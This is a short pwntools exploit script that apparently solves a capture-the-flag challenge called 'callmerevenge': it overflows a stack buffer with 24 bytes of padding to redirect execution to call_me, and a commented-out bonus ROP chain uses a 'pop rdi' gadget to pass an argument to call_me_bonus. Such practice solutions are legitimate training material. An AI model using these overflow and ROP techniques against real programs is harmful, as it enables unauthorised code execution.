#!/usr/bin/python

from pwn import *

IP = "127.0.0.1"
PORT = 32022

elf = context.binary = ELF("callmerevenge")
rop = ROP(elf)

gs = '''
b main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT)
    else:
        return process(elf.path)
    
p = start()

# The simple way:
# We just send a couple of As to reach just before the rip
# and then overflow it with the address of the target function.
fun = p64(elf.sym.call_me)

p.sendline(b"a"*24 + fun)

# The bonus solution:
# We need rdi register here and the pop instruction, which is used to 
# pass to a register a value from the top of the stack. This needed because,
# in assembly level, parameters are loaded in functions using registers 
# (64 bit arch) and the rdi is used for the function's first parameter.
# Moreover there is a global containg our target, so we will put its address
# on top of the stack, and pop rdi before it.

# pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
# cat_address = p64(0x402008)
# fun = p64(elf.sym.call_me_bonus)

# p.sendline(b"a"*24 + pop_rdi + cat_address + fun)

p.interactive()